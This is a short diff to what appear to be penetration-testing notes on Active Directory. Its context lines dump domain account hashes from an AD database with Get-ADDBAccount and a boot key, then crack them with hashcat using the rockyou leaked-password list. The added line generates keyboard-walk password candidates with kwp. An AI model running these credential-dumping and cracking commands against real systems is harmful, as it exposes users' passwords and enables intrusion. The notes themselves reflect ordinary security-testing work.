@@ -130,6 +130,12 @@ Get-ADDBAccount -BootKey $Key -DatabasePath 'C:\Users\p4yl0ad\Desktop\AD\poon\Ac
   Format-Custom -View HashcatNT | 
   Out-File C:\Users\p4yl0ad\Desktop\AD\poon\Hashdump.txt
  ```
+ 
+./kwp -z basechars/full.base keymaps/en-us.keymap routes/2-to-16-max-3-direction-changes.route > kwp3.txt
+
+
+ 
+ 
 hashcat -m 1000 -a 0 Hashdump.txt -o Cracked.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
 
 hashcat -m 1000 -a 0 Hashdump.txt -o Cracked-otrta.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt -r /usr/share/hashcat/rules/otrta.rule
